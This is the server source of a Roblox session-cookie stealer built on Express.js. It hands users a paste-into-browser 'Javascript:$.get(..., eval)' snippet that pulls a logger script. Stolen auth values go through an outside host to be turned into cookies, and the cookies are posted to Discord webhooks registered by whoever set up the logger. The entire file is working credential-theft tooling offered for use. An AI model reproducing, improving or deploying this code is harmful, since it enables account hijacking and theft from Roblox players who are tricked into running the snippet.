const express = require('express');
const cors = require('cors')
const fetch = require('node-fetch')
const fs = require('fs');
const bodyparser = require('body-parser')
const { allowedNodeEnvironmentFlags } = require('process');
const serverconf = require('./server.json')
const mongoclient = require("mongodb").MongoClient
const loggerfile = fs.readFileSync('./loggerscripts/app.js').toString()
const sanitize = require('mongo-sanitize')
require('dotenv').config()


const mongouri = serverconf['mongo_connection']

const app = express();

app.use(cors())
app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "https://www.roblox.com");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Credentials", "true");    
    next();
});
app.use(bodyparser.json())


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html')
})
app.get('/app.js', (req,res) => {
    res.sendFile(__dirname + '/public/app.js')
})
app.get('/mystyles.css', (req,res) => {
    res.sendFile(__dirname + '/public/mystyles.css')
})
app.get('/roblox-api', (req,res) => {
    const loggerid = req.query.id
    
    mongoclient.connect(mongouri, async function(err, client) {
        let db = client.db('Webhooks')
        let collection = db.collection('Webhooks')
        let index = await collection.findOne({key:loggerid.toString()});
        if (!index) return res.send('Not found.');

        res.send(loggerfile.replace('IDHERE',loggerid))
        client.close();
    })
})

async function convertToCookie(auth) {
    let data = await fetch("http://rwegfw3eg.hstn.me/?suggest="+auth, {
        mode:'no-cors'
    })
    await data
    data = await data.text()
    await data
    return data;
}

async function validwebhook(webhook) {
    let data = await fetch(webhook, {
        method: 'GET'
    })
    await data
    data = await data.text()
    await data;
    return data !== null 
}


app.post('/create-log', async (req, res) => {
    console.log(req.body)
    let webhook = req.body.webhook

    console.log(webhook)

    if (!webhook) {
        validwebhook(webhook)
    }
    else if(!validwebhook(webhook)) {
        res.send("Invalid webhook. COULDNT FIND RESPONSE FROM SERVER")
        return
    }

    mongoclient.connect(mongouri, async function(err, client) {
        let db = client.db('Webhooks')
        let collection = db.collection('Webhooks')
        webhook = sanitize(webhook)


        let lastindex = await collection.countDocuments()
        await lastindex
        let id = lastindex + 1
        
        collection.insertOne({
            key: (id).toString(),
            webhook: webhook
        }, function(err,succ) {
            if (succ) {
                let js = `Javascript:$.get("https://rbxlogmepls.herokuapp.com/roblox-api?id=${id}",eval)`
                res.send(js)
            }
        })

        client.close()
    })
})

app.post('/send-data', async (req, res) => {
    const id = req.query.id

    const auth = req.body.auth
    
    const cookie = await convertToCookie(auth)
    await cookie

    

    mongoclient.connect(mongouri, async function(err, client) {
        let db = client.db('Webhooks')
        let collection = db.collection('Webhooks')
        let index = await collection.findOne({key:id.toString()});
        if (!index) return res.send('Not found.');


        fetch(index.webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: 'ID '+index.id,
                embeds: [
                    {
                        "title": "Javascript X Log",
                        "fields": [
                            {
                                "name": "Cookie",
                                "value": "```"+cookie+"```"
                            }
                        ]
                    }
                ]
            })
        })

        res.send('All good.')
        return client.close();
    })
})

app.listen(process.env.PORT || 3000, () => {
    console.log('Listening..')
})
